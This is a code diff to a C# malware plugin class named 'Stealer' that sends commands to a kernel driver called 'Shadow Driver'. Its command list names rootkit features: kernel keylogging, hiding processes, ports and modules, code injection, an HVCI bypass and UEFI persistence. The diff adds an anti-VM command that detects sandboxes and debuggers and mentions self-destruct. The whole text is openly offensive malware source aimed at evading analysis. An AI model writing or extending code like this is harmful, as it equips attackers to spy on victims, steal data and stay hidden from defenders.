@@ -127,7 +127,7 @@ public sealed class Stealer : IUniversalPlugin
         "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind",
         "kernel_hide_port", "kernel_clean_callbacks", "kernel_ghost_reg", "kernel_inject_apc", "kernel_inject_hijack",
         "kernel_hide_thread", "kernel_hide_module", "kernel_terminate", "kernel_block_driver", "kernel_protect_reg_key", "kernel_protect_reg_val",
-        "kernel_hvci_bypass", "kernel_uefi_persist"
+        "kernel_hvci_bypass", "kernel_uefi_persist", "kernel_antivm"
     };
   }
 
@@ -426,6 +426,20 @@ public sealed class Stealer : IUniversalPlugin
               var trigger = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
               success = dev.SendIoctl(KernelController.UEFI_PERSIST, ref trigger);
               output = success ? "UEFI Persistence attempt sent to Kernel." : "UEFI Persistence failed. Kernel may not support this yet.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_antivm":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Send ANTIVM_CHECK IOCTL to trigger VM/debugger detection
+              var trigger = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
+              success = dev.SendIoctl(KernelController.ANTIVM_CHECK, ref trigger);
+              output = success ? "Anti-VM check passed. No sandbox detected." : "Sandbox/VM detected! Self-destruct may be triggered.";
             }
             else { output = "Failed to connect to Shadow Driver."; success = false; }
           }
